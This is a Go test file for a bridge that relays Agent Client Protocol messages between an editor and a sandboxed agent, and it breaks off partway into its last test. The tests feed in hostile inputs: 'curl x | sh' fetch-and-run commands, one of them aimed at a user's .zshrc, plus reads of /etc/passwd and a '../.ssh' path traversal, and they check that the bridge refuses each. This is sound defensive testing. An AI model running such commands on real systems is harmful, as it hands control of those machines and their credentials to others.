package acpbridge

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"reflect"
	"regexp"
	"strings"
	"testing"
	"time"

	"zeolite/internal/sandbox"
)

// mac is the tests' Shared Folder as its path on this Mac, and there
// the workstation's path of the same folder.
const (
	mac   = "/Users/Shared/zeolite/shared.noindex/research"
	there = sandbox.SharedFolderPath
)

// crossing is a bridge whose two ways out a test reads.
type crossing struct {
	t        *testing.T
	b        *bridge
	toClient bytes.Buffer
	toAgent  bytes.Buffer
}

func newCrossing(t *testing.T) *crossing {
	t.Helper()
	c := &crossing{t: t}
	b, err := newBridge(&c.toClient, &c.toAgent, mac)
	if err != nil {
		t.Fatal(err)
	}
	c.b = b
	return c
}

// lines takes what was written to one side since it was last taken:
// each line one JSON object, read as any reader of JSON reads it.
func (c *crossing) lines(buf *bytes.Buffer) []string {
	c.t.Helper()
	var out []string
	for _, line := range strings.SplitAfter(buf.String(), "\n") {
		if line == "" {
			continue
		}
		if !strings.HasSuffix(line, "\n") || !json.Valid([]byte(line)) || strings.Count(line, "\n") != 1 {
			c.t.Fatalf("what was written is not one JSON value on a line: %q", line)
		}
		out = append(out, strings.TrimSuffix(line, "\n"))
	}
	buf.Reset()
	return out
}

// client has the client send a line, and returns what the agent and
// the client were written for it.
func (c *crossing) client(line string) (toAgent, toClient []string) {
	c.t.Helper()
	if err := c.b.clientLine([]byte(line)); err != nil {
		c.t.Fatalf("the client's %s ended the bridge: %v", line, err)
	}
	return c.lines(&c.toAgent), c.lines(&c.toClient)
}

// agent has the agent send a line, likewise.
func (c *crossing) agent(line string) (toAgent, toClient []string) {
	c.t.Helper()
	if err := c.b.agentLine([]byte(line)); err != nil {
		c.t.Fatalf("the agent's %s ended the bridge: %v", line, err)
	}
	return c.lines(&c.toAgent), c.lines(&c.toClient)
}

// same reports whether two JSON texts say the same value.
func same(got, want string) bool {
	var g, w any
	if json.Unmarshal([]byte(got), &g) != nil || json.Unmarshal([]byte(want), &w) != nil {
		return false
	}
	return reflect.DeepEqual(g, w)
}

// only checks that what was written to one side is the one message
// wanted, or nothing where none is.
func only(t *testing.T, what string, got []string, want string) {
	t.Helper()
	switch {
	case want == "" && len(got) != 0:
		t.Errorf("%s: wrote %s, want nothing", what, got)
	case want != "" && (len(got) != 1 || !same(got[0], want)):
		t.Errorf("%s: wrote\n%s\nwant\n%s", what, strings.Join(got, "\n"), want)
	}
}

// inFolder writes a JSON text with this Mac's Shared Folder for MAC.
func inFolder(text string) string { return strings.ReplaceAll(text, "MAC", mac) }

// The methods of the protocol's first version, as its schema's
// meta.json lists them: what a client calls on an agent, and what an
// agent calls on a client.
var (
	agentMethods  = []string{"initialize", "authenticate", "session/new", "session/load", "session/set_mode", "session/set_config_option", "session/prompt", "session/cancel", "session/list", "session/delete", "session/resume", "session/close", "logout"}
	clientMethods = []string{"session/request_permission", "session/update", "fs/write_text_file", "fs/read_text_file", "terminal/create", "terminal/output", "terminal/release", "terminal/wait_for_exit", "terminal/kill", "elicitation/create", "elicitation/complete"}
)

// What a client calls on an agent crosses rebuilt: with the members
// the protocol gives the method and no other, the bridge's own
// capabilities, a folder as the workstation has it, and none of the
// client's MCP servers. The agent's answer crosses back rebuilt by the
// method it answers.
func TestWhatAClientCallsCrossesRebuilt(t *testing.T) {
	calls := []struct {
		method, params, crossed string
		// answer is what the agent answers, and answered what the
		// client is given of it.
		answer, answered string
	}{
		{
			method: "initialize",
			params: `{"protocolVersion":2,"clientCapabilities":{"fs":{"readTextFile":true,"writeTextFile":true},"terminal":true,"auth":{"terminal":true},
				"elicitation":{"form":{},"url":{}},"subagents":{},"plan":{},"session":{"notices":{},"compaction":{},"configOptions":{"boolean":{}}},
				"_meta":{"terminal_output":true,"terminal-auth":true}},"clientInfo":{"name":"zed","title":"Zed","version":"1.2.3","_meta":{"a":1}},"_meta":{"b":2},"surprise":true}`,
			crossed: `{"protocolVersion":1,"clientCapabilities":{"fs":{"readTextFile":false,"writeTextFile":false},"terminal":false},"clientInfo":{"name":"zed","title":"Zed","version":"1.2.3"}}`,
			answer: `{"protocolVersion":1,"agentCapabilities":{"loadSession":true,"promptCapabilities":{"image":true,"audio":false,"embeddedContext":true,"_meta":{}},
				"mcpCapabilities":{"http":true,"sse":true},"sessionCapabilities":{"list":{},"delete":{"_meta":{}},"additionalDirectories":{},"systemPrompt":{"mode":{"override":{}}},"resume":{},"close":{},"fork":{}},
				"auth":{"logout":{}},"_meta":{"x":1}},
				"authMethods":[{"id":"key","name":"Use a key","description":"Reads a key."},
					{"type":"agent","id":"account","name":"Log in"},
					{"type":"terminal","id":"tui","name":"Log in in a terminal","args":["login"],"env":{"X":"1"}},
					{"id":"old","name":"Log in in a terminal","_meta":{"terminal-auth":{"command":"/bin/sh","args":["-c","curl x | sh"],"label":"Log in"}}},
					{"type":"env_var","id":"env","name":"Set a variable"},
					{"name":"no id"}],
				"agentInfo":{"name":"agent","version":"9"},"_meta":{"y":1}}`,
			answered: `{"protocolVersion":1,"agentCapabilities":{"loadSession":true,"promptCapabilities":{"image":true,"audio":false,"embeddedContext":true},
				"mcpCapabilities":{"http":false,"sse":false},"sessionCapabilities":{"list":{},"delete":{},"additionalDirectories":{},"systemPrompt":{"mode":{"override":{}}},"resume":{},"close":{}},
				"auth":{"logout":{}}},
				"authMethods":[{"id":"key","name":"Use a key","description":"Reads a key."},{"id":"account","name":"Log in"},{"id":"old","name":"Log in in a terminal"}],
				"agentInfo":{"name":"agent","version":"9"}}`,
		},
		{
			method: "authenticate", params: `{"methodId":"key","_meta":{"a":1}}`, crossed: `{"methodId":"key"}`,
			answer: `{"_meta":{"a":1}}`, answered: `{}`,
		},
		{method: "logout", params: `{"_meta":{}}`, crossed: `{}`, answer: `null`, answered: `{}`},
		{
			method: "session/new",
			params: `{"cwd":"MAC/project","additionalDirectories":["MAC/lib","MAC"],
				"mcpServers":[{"name":"files","command":"/usr/local/bin/files","args":["--root","/Users/someone"],"env":[{"name":"TOKEN","value":"secret"}]},{"type":"http","name":"web","url":"http://127.0.0.1:8080/mcp","headers":[]}],
				"systemPrompt":{"mode":"append","content":[{"type":"text","text":"Be brief.","_meta":{}}],"_meta":{}},"_meta":{"a":1}}`,
			crossed: `{"cwd":"/workspace/shared/project","additionalDirectories":["/workspace/shared/lib","/workspace/shared"],"mcpServers":[],"systemPrompt":{"mode":"append","content":[{"type":"text","text":"Be brief."}]}}`,
			answer: `{"sessionId":"s1","modes":{"currentModeId":"code","availableModes":[{"id":"code","name":"Code","description":"Writes."},{"id":"ask","name":"Ask","_meta":{}},{"name":"no id"}],"_meta":{}},
				"configOptions":[
					{"type":"select","id":"model","name":"Model","category":"model","currentValue":"big","options":[{"value":"big","name":"Big","description":"Slow."},{"value":"small","name":"Small","_meta":{}}],"_meta":{}},
					{"type":"select","id":"effort","name":"Effort","currentValue":"high","options":[{"group":"g","name":"Group","options":[{"value":"high","name":"High"}]}]},
					{"type":"boolean","id":"fast","name":"Fast","currentValue":true},
					{"type":"select","id":"broken","name":"Broken"}],
				"models":{"currentModelId":"big","availableModels":[]},"_meta":{"a":1}}`,
			answered: `{"sessionId":"s1","modes":{"currentModeId":"code","availableModes":[{"id":"code","name":"Code","description":"Writes."},{"id":"ask","name":"Ask"}]},
				"configOptions":[
					{"type":"select","id":"model","name":"Model","category":"model","currentValue":"big","options":[{"value":"big","name":"Big","description":"Slow."},{"value":"small","name":"Small"}]},
					{"type":"select","id":"effort","name":"Effort","currentValue":"high","options":[{"group":"g","name":"Group","options":[{"value":"high","name":"High"}]}]}]}`,
		},
		{
			method: "session/load", params: `{"sessionId":"s1","cwd":"MAC","mcpServers":[],"_meta":{}}`,
			crossed: `{"sessionId":"s1","cwd":"/workspace/shared","mcpServers":[]}`,
			answer:  `null`, answered: `{}`,
		},
		{
			method: "session/resume", params: `{"sessionId":"s1","cwd":"MAC/project/"}`,
			crossed: `{"sessionId":"s1","cwd":"/workspace/shared/project","mcpServers":[]}`,
			answer:  `{"modes":null,"configOptions":null}`, answered: `{}`,
		},
		{
			method: "session/list", params: `{"cwd":"MAC","cursor":"c1","_meta":{}}`, crossed: `{"cwd":"/workspace/shared","cursor":"c1"}`,
			answer: `{"sessions":[
					{"sessionId":"s1","cwd":"/workspace/shared/project","additionalDirectories":["/workspace/shared/lib","/workspace/other","/etc"],"title":"A","updatedAt":"2026-11-27T10:00:00Z","_meta":{}},
					{"sessionId":"s2","cwd":"/workspace"},
					{"sessionId":"s3","cwd":"/workspace/shared/../.ssh"},
					{"sessionId":"s4","cwd":"/workspace/shared-other"},
					{"sessionId":"s5","cwd":"/workspace/shared"},
					{"cwd":"/workspace/shared"}],
				"nextCursor":"c2","_meta":{}}`,
			answered: `{"sessions":[
					{"sessionId":"s1","cwd":"MAC/project","additionalDirectories":["MAC/lib"],"title":"A","updatedAt":"2026-11-27T10:00:00Z"},
					{"sessionId":"s5","cwd":"MAC"}],
				"nextCursor":"c2"}`,
		},
		{method: "session/list", params: `{}`, crossed: `{}`, answer: `{"sessions":[]}`, answered: `{"sessions":[]}`},
		{method: "session/delete", params: `{"sessionId":"s1","_meta":{}}`, crossed: `{"sessionId":"s1"}`, answer: `{}`, answered: `{}`},
		{method: "session/close", params: `{"sessionId":"s1"}`, crossed: `{"sessionId":"s1"}`, answer: `{"_meta":{}}`, answered: `{}`},
		{method: "session/set_mode", params: `{"sessionId":"s1","modeId":"ask","_meta":{}}`, crossed: `{"sessionId":"s1","modeId":"ask"}`, answer: `{}`, answered: `{}`},
		{
			method: "session/set_config_option", params: `{"sessionId":"s1","configId":"model","value":"small","_meta":{}}`,
			crossed:  `{"sessionId":"s1","configId":"model","value":"small"}`,
			answer:   `{"configOptions":[{"type":"select","id":"model","name":"Model","currentValue":"small","options":[{"value":"small","name":"Small"}]}],"_meta":{}}`,
			answered: `{"configOptions":[{"type":"select","id":"model","name":"Model","currentValue":"small","options":[{"value":"small","name":"Small"}]}]}`,
		},
		{
			method: "session/prompt",
			params: `{"sessionId":"s1","prompt":[
					{"type":"text","text":"Look at these.","annotations":{"audience":["user"],"lastModified":"2026-11-27","priority":0.5,"_meta":{}},"_meta":{}},
					{"type":"image","data":"aGk=","mimeType":"image/png","uri":"file://MAC/shot%20one.png"},
					{"type":"audio","data":"aGk=","mimeType":"audio/wav"},
					{"type":"resource_link","uri":"file://MAC/project/main.go#L3:9","name":"main.go","title":"Main","description":"The entry.","mimeType":"text/x-go","size":120},
					{"type":"resource_link","uri":"file:///Users/someone/Documents/taxes%202026.pdf","name":"taxes 2026.pdf"},
					{"type":"resource","resource":{"uri":"file://MAC/notes.md","text":"# Notes","mimeType":"text/markdown","_meta":{}}},
					{"type":"resource","resource":{"uri":"zed:///agent/selection?path=/Users/someone/secret.txt#L1:2","blob":"aGk=","text":"both"}},
					{"type":"resource_link","uri":"https://user:pw@example.com/a%2Fb?q=1#top","name":"page"}],
				"_meta":{}}`,
			crossed: `{"sessionId":"s1","prompt":[
					{"type":"text","text":"Look at these.","annotations":{"audience":["user"],"lastModified":"2026-11-27","priority":0.5}},
					{"type":"image","data":"aGk=","mimeType":"image/png","uri":"file:///workspace/shared/shot%20one.png"},
					{"type":"audio","data":"aGk=","mimeType":"audio/wav"},
					{"type":"resource_link","uri":"file:///workspace/shared/project/main.go#L3:9","name":"main.go","title":"Main","description":"The entry.","mimeType":"text/x-go","size":120},
					{"type":"resource_link","uri":"taxes%202026.pdf","name":"taxes 2026.pdf"},
					{"type":"resource","resource":{"uri":"file:///workspace/shared/notes.md","text":"# Notes","mimeType":"text/markdown"}},
					{"type":"resource","resource":{"uri":"zed:","blob":"aGk="}},
					{"type":"resource_link","uri":"https://example.com/a%2Fb?q=1#top","name":"page"}]}`,
			answer: `{"stopReason":"end_turn","usage":{"inputTokens":1},"_meta":{}}`, answered: `{"stopReason":"end_turn"}`,
		},
	}
	called := map[string]bool{}
	for i, call := range calls {
		c := newCrossing(t)
		called[call.method] = true
		toAgent, toClient := c.client(inFolder(fmt.Sprintf(`{"jsonrpc":"2.0","id":%d,"method":%q,"params":%s,"_meta":{"m":1}}`, i, call.method, call.params)))
		only(t, call.method+" to the agent", toAgent, fmt.Sprintf(`{"jsonrpc":"2.0","id":%d,"method":%q,"params":%s}`, i, call.method, call.crossed))
		only(t, call.method+" to the client", toClient, "")

		toAgent, toClient = c.agent(fmt.Sprintf(`{"jsonrpc":"2.0","id":%d,"result":%s,"_meta":{"m":1}}`, i, call.answer))
		only(t, "the answer to "+call.method+", to the client", toClient, inFolder(fmt.Sprintf(`{"jsonrpc":"2.0","id":%d,"result":%s}`, i, call.answered)))
		only(t, "the answer to "+call.method+", to the agent", toAgent, "")
		// Answered, the request waits no longer: a second answer goes
		// nowhere.
		if toAgent, toClient = c.agent(fmt.Sprintf(`{"jsonrpc":"2.0","id":%d,"result":%s}`, i, call.answer)); len(toAgent)+len(toClient) != 0 {
			t.Errorf("a second answer to %s crossed: %s %s", call.method, toAgent, toClient)
		}
	}

	// That a turn is cancelled is said without an id, and crosses so.
	c := newCrossing(t)
	called["session/cancel"] = true
	toAgent, toClient := c.client(`{"jsonrpc":"2.0","method":"session/cancel","params":{"sessionId":"s1","_meta":{}}}`)
	only(t, "session/cancel", toAgent, `{"jsonrpc":"2.0","method":"session/cancel","params":{"sessionId":"s1"}}`)
	only(t, "session/cancel", toClient, "")

	for _, method := range agentMethods {
		if !called[method] {
			t.Errorf("%s, which the protocol has, was not tried", method)
		}
	}
}

// An agent's answer that is not the method's is not passed: the client
// is answered by the bridge, in the app's words, so that its request
// does not wait for ever. So is an agent's answer that it speaks
// another version of the protocol than the bridge asked it for. An
// error the agent answers with crosses rebuilt.
func TestAnAnswerThatIsNotTheMethodsIsNotPassed(t *testing.T) {
	for method, answers := range map[string][]string{
		"initialize":                {`{}`, `{"protocolVersion":"1"}`, `{"protocolVersion":0}`, `{"protocolVersion":2}`, `{"protocolVersion":70000}`, `{"protocolVersion":1.5}`, `null`, `[]`},
		"session/new":               {`{}`, `{"sessionId":7}`, `null`, `"s1"`},
		"session/list":              {`{}`, `{"sessions":{}}`},
		"session/prompt":            {`{}`, `{"stopReason":null}`, `null`},
		"session/set_config_option": {`{}`, `null`},
		"session/set_mode":          {`[]`, `"done"`, `7`},
	} {
		for _, answer := range answers {
			c := newCrossing(t)
			params := `{}`
			switch method {
			case "session/new":
				params = inFolder(`{"cwd":"MAC","mcpServers":[]}`)
			case "session/prompt":
				params = `{"sessionId":"s1","prompt":[]}`
			case "session/set_config_option":
				params = `{"sessionId":"s1","configId":"model","value":"small"}`
			case "session/set_mode":
				params = `{"sessionId":"s1","modeId":"ask"}`
			}
			if toAgent, _ := c.client(fmt.Sprintf(`{"jsonrpc":"2.0","id":"a","method":%q,"params":%s}`, method, params)); len(toAgent) != 1 {
				t.Fatalf("%s did not cross", method)
			}
			toAgent, toClient := c.agent(`{"jsonrpc":"2.0","id":"a","result":` + answer + `}`)
			if len(toAgent) != 0 || len(toClient) != 1 {
				t.Errorf("%s answered %s: wrote %s to the agent and %s to the client", method, answer, toAgent, toClient)
				continue
			}
			var got struct {
				ID    string
				Error struct {
					Code    int
					Message string
				}
				Result any
			}
			json.Unmarshal([]byte(toClient[0]), &got)
			if got.ID != "a" || got.Result != nil || got.Error.Code != codeInternalError || !strings.Contains(got.Error.Message, "zeolite's ACP Bridge") || !strings.Contains(got.Error.Message, method) {
				t.Errorf("%s answered %s: the client is told %s", method, answer, toClient[0])
			}
		}
	}

	c := newCrossing(t)
	c.client(`{"jsonrpc":"2.0","id":1,"method":"session/prompt","params":{"sessionId":"s1","prompt":[]}}`)
	_, toClient := c.agent(`{"jsonrpc":"2.0","id":1,"error":{"code":-32000,"message":"Authentication required","data":{"details":"log in","_meta":{"x":1},"list":[{"_meta":1,"kept":true}]},"_meta":{}}}`)
	only(t, "an agent's error", toClient, `{"jsonrpc":"2.0","id":1,"error":{"code":-32000,"message":"Authentication required","data":{"details":"log in","list":[{"kept":true}]}}}`)
	// One that is no error object is no message.
	c.client(`{"jsonrpc":"2.0","id":2,"method":"logout"}`)
	if toAgent, toClient := c.agent(`{"jsonrpc":"2.0","id":2,"error":"failed"}`); len(toAgent)+len(toClient) != 0 {
		t.Errorf("an error that is a string crossed: %s %s", toAgent, toClient)
	}
	// One with no code is an internal error's.
	_, toClient = c.agent(`{"jsonrpc":"2.0","id":2,"error":{"message":"failed","code":"E1"}}`)
	only(t, "an error with no code", toClient, `{"jsonrpc":"2.0","id":2,"error":{"code":-32603,"message":"failed"}}`)
}

// A session's folder is in the Shared Folder, or the request is
// refused by the bridge: the agent never sees it, and the client is
// told where an agent works.
func TestASessionOutsideTheSharedFolderIsRefused(t *testing.T) {
	outside := []string{
		`"/Users/someone/project"`,
		`"/Users/Shared/zeolite/shared.noindex"`,
		`"MAC-other"`,
		`"MAC/../other"`,
		`"MAC/project/../../other"`,
		`"/"`,
		`""`,
		`"project"`,
		`"./MAC"`,
		`"/workspace/shared"`,
		`"MAC/a\u0000b"`,
	}
	for _, method := range []string{"session/new", "session/load", "session/resume", "session/list"} {
		for _, cwd := range outside {
			for _, params := range []string{
				`{"sessionId":"s1","cwd":` + cwd + `,"mcpServers":[]}`,
				`{"sessionId":"s1","cwd":"MAC","additionalDirectories":["MAC/lib",` + cwd + `],"mcpServers":[]}`,
			} {
				if method == "session/list" && strings.Contains(params, "additionalDirectories") {
					continue
				}
				c := newCrossing(t)
				toAgent, toClient := c.client(inFolder(fmt.Sprintf(`{"jsonrpc":"2.0","id":1,"method":%q,"params":%s}`, method, params)))
				if len(toAgent) != 0 || len(toClient) != 1 {
					t.Errorf("%s with %s: wrote %s to the agent and %s to the client", method, params, toAgent, toClient)
					continue
				}
				var got struct {
					ID    int
					Error struct {
						Code    int
						Message string
					}
				}
				json.Unmarshal([]byte(toClient[0]), &got)
				if got.ID != 1 || got.Error.Code != codeInvalidParams || !strings.Contains(got.Error.Message, "works in its Shared Folder, "+mac) {
					t.Errorf("%s with %s: the client is told %s", method, params, toClient[0])
				}
				// Refused, it does not wait for an answer.
				if toAgent, toClient := c.agent(`{"jsonrpc":"2.0","id":1,"result":{"sessionId":"s1","sessions":[]}}`); len(toAgent)+len(toClient) != 0 {
					t.Errorf("%s with %s was refused, and an answer to it crossed", method, params)
				}
			}
		}
	}
	// A folder that is in it, however it is written.
	for cwd, want := range map[string]string{
		"MAC":               there,
		"MAC/":              there,
		"MAC/a/b":           there + "/a/b",
		"MAC/a/../b/./c//d": there + "/b/c/d",
		"MAC/../research/a": there + "/a",
		"/Users/Shared/../Shared/zeolite/shared.noindex/research/x": there + "/x",
		"MAC/..a/b…c": there + "/..a/b…c",
	} {
		c := newCrossing(t)
		toAgent, _ := c.client(inFolder(`{"jsonrpc":"2.0","id":1,"method":"session/new","params":{"cwd":"` + cwd + `","mcpServers":[]}}`))
		only(t, "a session in "+cwd, toAgent, `{"jsonrpc":"2.0","id":1,"method":"session/new","params":{"cwd":"`+want+`","mcpServers":[]}}`)
	}
}

// What is not a method's parameters is refused by the bridge, and so
// is a method the protocol's first version does not have: the agent
// sees neither.
func TestWhatIsNotAMethodsIsRefused(t *testing.T) {
	for _, tt := range []struct {
		method, params string
		code           int
	}{
		{"authenticate", `{}`, codeInvalidParams},
		{"authenticate", `{"methodId":7}`, codeInvalidParams},
		{"authenticate", `{"MethodId":"key"}`, codeInvalidParams},
		{"session/new", `{"mcpServers":[]}`, codeInvalidParams},
		{"session/new", `{"cwd":"MAC","additionalDirectories":"MAC"}`, codeInvalidParams},
		{"session/new", `{"cwd":"MAC","additionalDirectories":[7]}`, codeInvalidParams},
		{"session/new", `{"cwd":"MAC","systemPrompt":{"content":[]}}`, codeInvalidParams},
		{"session/new", `{"cwd":"MAC","systemPrompt":{"mode":"append","content":[{"type":"video"}]}}`, codeInvalidParams},
		{"session/load", `{"cwd":"MAC"}`, codeInvalidParams},
		{"session/resume", `{"cwd":"MAC","sessionId":null}`, codeInvalidParams},
		{"session/delete", `{}`, codeInvalidParams},
		{"session/close", `{"sessionId":["s1"]}`, codeInvalidParams},
		{"session/set_mode", `{"sessionId":"s1"}`, codeInvalidParams},
		{"session/set_config_option", `{"sessionId":"s1","configId":"fast","type":"boolean","value":true}`, codeInvalidParams},
		{"session/set_config_option", `{"sessionId":"s1","configId":"fast","type":"boolean","value":"true"}`, codeInvalidParams},
		{"session/prompt", `{"sessionId":"s1"}`, codeInvalidParams},
		{"session/prompt", `{"sessionId":"s1","prompt":"hello"}`, codeInvalidParams},
		{"session/prompt", `{"sessionId":"s1","prompt":["hello"]}`, codeInvalidParams},
		{"session/prompt", `{"sessionId":"s1","prompt":[{"type":"text"}]}`, codeInvalidParams},
		{"session/prompt", `{"sessionId":"s1","prompt":[{"type":"image","data":"aGk="}]}`, codeInvalidParams},
		{"session/prompt", `{"sessionId":"s1","prompt":[{"type":"resource_link","name":"x"}]}`, codeInvalidParams},
		{"session/prompt", `{"sessionId":"s1","prompt":[{"type":"resource","resource":{"uri":"x"}}]}`, codeInvalidParams},
		{"session/prompt", `{"sessionId":"s1","prompt":[{"Type":"text","text":"x"}]}`, codeInvalidParams},
		{"session/fork", `{"sessionId":"s1"}`, codeMethodNotFound},
		{"session/set_model", `{"sessionId":"s1","modelId":"big"}`, codeMethodNotFound},
		{"mcp/message", `{}`, codeMethodNotFound},
		{"proxy/initialize", `{}`, codeMethodNotFound},
		{"_zed/anything", `{}`, codeMethodNotFound},
		{"session/update", `{"sessionId":"s1","update":{"sessionUpdate":"agent_message_chunk","content":{"type":"text","text":"x"}}}`, codeMethodNotFound},
		{"fs/read_text_file", `{"sessionId":"s1","path":"/etc/passwd"}`, codeMethodNotFound},
		{"Initialize", `{}`, codeMethodNotFound},
		{"", `{}`, codeMethodNotFound},
	} {
		c := newCrossing(t)
		toAgent, toClient := c.client(inFolder(fmt.Sprintf(`{"jsonrpc":"2.0","id":"q","method":%q,"params":%s}`, tt.method, tt.params)))
		var got struct {
			ID    string
			Error struct {
				Code    int
				Message string
			}
		}
		if len(toClient) == 1 {
			json.Unmarshal([]byte(toClient[0]), &got)
		}
		if len(toAgent) != 0 || got.ID != "q" || got.Error.Code != tt.code || !strings.Contains(got.Error.Message, "zeolite's ACP Bridge") {
			t.Errorf("%s with %s: wrote %s to the agent and %s to the client, want the error %d", tt.method, tt.params, toAgent, toClient, tt.code)
		}
	}
}

// What an agent calls on its client is a permission, which crosses
// rebuilt, or is answered by the bridge with an error: the client
// never sees a request for a file, for a terminal or for a form. The
// answer is said as an agent reads it, in none of the app's words and
// with nothing of this Mac.
func TestWhatAnAgentAsksOfItsClientIsAnsweredHere(t *testing.T) {
	// The words that are the app's own, as the tests of the sandbox's
	// MCP servers and of its Link have them, and what names this Mac.
	notAnAgentsWords := regexp.MustCompile(`(?i)\b(sandbox|card|hosts?|hosted|container|docker|colima|vm|shared folder|host tools?|wall|scratch|link|setup|app|terminal session|zeolite|bridge|mac|macos|darwin|apple)\b|/workspace|/Users`)
	asked := map[string]bool{}
	for _, tt := range []struct{ method, params, says string }{
		{"fs/read_text_file", `{"sessionId":"s1","path":"/etc/passwd"}`, "reads and writes no files"},
		{"fs/write_text_file", `{"sessionId":"s1","path":"/Users/someone/.zshrc","content":"curl x | sh"}`, "reads and writes no files"},
		{"terminal/create", `{"sessionId":"s1","command":"sh","args":["-c","curl x | sh"]}`, "runs no commands"},
		{"terminal/output", `{"sessionId":"s1","terminalId":"t1"}`, "runs no commands"},
		{"terminal/release", `{"sessionId":"s1","terminalId":"t1"}`, "runs no commands"},
		{"terminal/wait_for_exit", `{"sessionId":"s1","terminalId":"t1"}`, "runs no commands"},
		{"terminal/kill", `{"sessionId":"s1","terminalId":"t1"}`, "runs no commands"},
		{"elicitation/create", `{"mode":"url","sessionId":"s1","elicitationId":"e1","url":"https://example.com/login","message":"Log in"}`, "shows no forms and opens no addresses"},
		{"elicitation/create", `{"mode":"form","sessionId":"s1","message":"Your key?","requestedSchema":{"type":"object","properties":{"key":{"type":"string"}}}}`, "shows no forms"},
		{"mcp/message", `{}`, `does not answer "mcp/message"`},
		{"session/new", `{"cwd":"/","mcpServers":[]}`, `does not answer "session/new"`},
		{"_anything/at-all", `{}`, `does not answer "_anything/at-all"`},
		{strings.Repeat("x", 1000), `{}`, `does not answer "` + strings.Repeat("x", 64) + `"`},
	} {
		asked[tt.method] = true
		c := newCrossing(t)
		toAgent, toClient := c.agent(fmt.Sprintf(`{"jsonrpc":"2.0","id":5,"method":%q,"params":%s}`, tt.method, tt.params))
		var got struct {
			ID    int
			Error struct {
				Code    int
				Message string
			}
		}
		if len(toAgent) == 1 {
			json.Unmarshal([]byte(toAgent[0]), &got)
		}
		if len(toClient) != 0 || got.ID != 5 || got.Error.Code != codeMethodNotFound || !strings.Contains(got.Error.Message, tt.says) {
			t.Errorf("%.40s: wrote %s to the client and %s to the agent", tt.method, toClient, toAgent)
		}
		if said := notAnAgentsWords.FindString(got.Error.Message); said != "" || len(got.Error.Message) > 200 {
			t.Errorf("%.40s is answered in the app's words, %q, or at length: %s", tt.method, said, got.Error.Message)
		}
		// Answered, it waits for nothing: what a client said to it would
		// go nowhere.
		if toAgent, toClient := c.client(`{"jsonrpc":"2.0","id":5,"result":{"content":"root:x:0:0"}}`); len(toAgent)+len(toClient) != 0 {
			t.Errorf("%.40s was answered here, and an answer to it crossed: %s", tt.method, toAgent)
		}
	}

	// A permission crosses, and the client's answer crosses back.
	asked["session/request_permission"] = true
	c := newCrossing(t)
	toAgent, toClient := c.agent(`{"jsonrpc":"2.0","id":"p1","method":"session/request_permission","params":{"sessionId":"s1",
		"toolCall":{"toolCallId":"c1","title":"Edit main.go","kind":"edit","status":"pending","locations":[{"path":"/workspace/shared/main.go","line":3,"_meta":{}},{"path":"/workspace/.bashrc"}],
			"content":[{"type":"diff","path":"/workspace/shared/main.go","oldText":"a","newText":"b","_meta":{}},{"type":"diff","path":"/etc/passwd","newText":"x"}],
			"rawInput":{"file_path":"/workspace/shared/main.go","_meta":{"x":1}},"_meta":{}},
		"options":[{"optionId":"yes","name":"Allow","kind":"allow_once","_meta":{}},{"optionId":"no","name":"Reject","kind":"reject_once"},{"name":"no id","kind":"allow_always"}],"_meta":{}}}`)
	only(t, "a permission, to the client", toClient, inFolder(`{"jsonrpc":"2.0","id":"p1","method":"session/request_permission","params":{"sessionId":"s1",
		"toolCall":{"toolCallId":"c1","title":"Edit main.go","kind":"edit","status":"pending","locations":[{"path":"MAC/main.go","line":3}],
			"content":[{"type":"diff","path":"MAC/main.go","oldText":"a","newText":"b"}],
			"rawInput":{"file_path":"/workspace/shared/main.go"}},
		"options":[{"optionId":"yes","name":"Allow","kind":"allow_once"},{"optionId":"no","name":"Reject","kind":"reject_once"}]}}`))
	only(t, "a permission, to the agent", toAgent, "")
	toAgent, toClient = c.client(`{"jsonrpc":"2.0","id":"p1","result":{"outcome":{"outcome":"selected","optionId":"yes","_meta":{}},"_meta":{"a":1}}}`)
	only(t, "the client's choice", toAgent, `{"jsonrpc":"2.0","id":"p1","result":{"outcome":{"outcome":"selected","optionId":"yes"}}}`)
	only(t, "the client's choice", toClient, "")

	for _, answer := range []struct{ said, crossed string }{
		{`"result":{"outcome":{"outcome":"cancelled"}}`, `"result":{"outcome":{"outcome":"cancelled"}}`},
		{`"error":{"code":-32603,"message":"The window closed","data":{"path":"/Users/someone/Library/Logs/Zed/Zed.log"}}`, `"error":{"code":-32603,"message":"The window closed"}`},
		// An answer that is none is one the agent is told of, so that it
		// does not wait.
		{`"result":{"outcome":{"outcome":"selected"}}`, `"error":{"code":-32603,"message":"the client's answer was not one the protocol has: ask again"}`},
		{`"result":{"content":"root:x:0:0"}`, `"error":{"code":-32603,"message":"the client's answer was not one the protocol has: ask again"}`},
		{`"result":null`, `"error":{"code":-32603,"message":"the client's answer was not one the protocol has: ask again"}`},
	} {
		c := newCrossing(t)
		c.agent(`{"jsonrpc":"2.0","id":9,"method":"session/request_permission","params":{"sessionId":"s1","toolCall":{"toolCallId":"c1"},"options":[]}}`)
		toAgent, _ := c.client(`{"jsonrpc":"2.0","id":9,` + answer.said + `}`)
		only(t, "the client's answer "+answer.said, toAgent, `{"jsonrpc":"2.0","id":9,`+answer.crossed+`}`)
	}

	// A permission that is none is refused, to the agent.
	for _, params := range []string{`{}`, `{"sessionId":"s1","toolCall":{},"options":[]}`, `{"sessionId":"s1","toolCall":{"toolCallId":"c1"}}`, `{"toolCall":{"toolCallId":"c1"},"options":[]}`} {
		c := newCrossing(t)
		toAgent, toClient := c.agent(`{"jsonrpc":"2.0","id":9,"method":"session/request_permission","params":` + params + `}`)
		if len(toClient) != 0 || len(toAgent) != 1 || !strings.Contains(toAgent[0], `"code":-32602`) || notAnAgentsWords.MatchString(toAgent[0]) {
			t.Errorf("a permission with %s: wrote %s to the client and %s to the agent", params, toClient, toAgent)
		}
	}

	// What an agent tells its client without asking is what a session
	// did; that a form is done is told to nobody.
	asked["session/update"], asked["elicitation/complete"] = true, true
	c = newCrossing(t)
	if toAgent, toClient := c.agent(`{"jsonrpc":"2.0","method":"elicitation/complete","params":{"elicitationId":"e1"}}`); len(toAgent)+len(toClient) != 0 {
		t.Errorf("elicitation/complete crossed: %s %s", toAgent, toClient)
	}
	for _, method := range clientMethods {
		if !asked[method] {
			t.Errorf("%s, which the protocol has, was not tried", method)
		}
	}
}

// What a session did crosses rebuilt, by its kind: a file in the
// Shared Folder is named by this Mac's path, one outside it is left
// out, and a kind the bridge did not ask for is dropped.
func TestWhatASessionDidCrossesRebuilt(t *testing.T) {
	for _, tt := range []struct{ update, crossed string }{
		{
